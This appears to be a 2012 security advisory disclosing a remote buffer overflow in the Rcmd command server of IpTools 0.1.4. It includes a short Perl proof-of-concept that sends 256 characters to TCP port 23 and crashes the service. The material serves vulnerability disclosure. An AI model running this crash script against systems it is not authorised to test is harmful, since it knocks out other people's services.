source: http://www.securityfocus.com/bid/51312/info

IPtools is prone to a remote buffer-overflow vulnerability because it fails to bounds-check user-supplied input before copying it into an insufficiently sized memory buffer.

Exploiting this vulnerability may allow remote attackers to execute arbitrary code in the context of the affected device. Failed exploit attempts will result in a denial-of-service condition.

IPtools 0.1.4 is vulnerable; other versions may also be affected. 

Title: IpTools(Tiny TCP/IP server) - Rcmd Remote Overflow Vulnerability

Software : IpTools(Tiny TCP/IP server)

Software Version : 0.1.4

Vendor: http://iptools.sourceforge.net/iptools.html

Class: Boundary Condition Error

CVE:

Remote: Yes

Local: No

Published: 2012-01-07

Updated:

Impact : High

Bug Description :
IPtools is a set of small tiny TCP/IP programs includes Remote command server(not a telnet server, Executable file: Rcmd.bat), etc.
And the remote command server would bind tcp port 23, but it does not validate the command input size leading to a Denial Of Service
flaw while sending more than 255 characters to it.

POC:
#-------------------------------------------------------------
#!/usr/bin/perl -w
#IpTools(0.1.4) - Rcmd Remote Crash PoC by demonalex (at) 163 (dot) com [email concealed]
#-------------------------------------------------------------
use IO::Socket;
$remote_host = '127.0.0.1'; #victim ip as your wish
$remote_port = 23; #rcmd default port number
$sock = IO::Socket::INET->new(PeerAddr => $remote_host, PeerPort => $remote_port,
Timeout => 60) || die "$remote_host -> $remote_port is closed!\n";
$sock->recv($content, 1000, 0);
$count=0;
while($count<=255){
$sock->send("a", 0);
$count++;
}
$sock->send("\r\n", 0);
$sock->recv($content, 1000, 0);
$sock->shutdown(2);
exit(1);
#-------------------------------------------------------------

Credits : This vulnerability was discovered by demonalex (at) 163 (dot) com [email concealed]
mail: demonalex (at) 163 (dot) com [email concealed] / ChaoYi.Huang (at) connect.polyu (dot) hk [email concealed]
Pentester/Researcher
Dark2S Security Team/PolyU.HK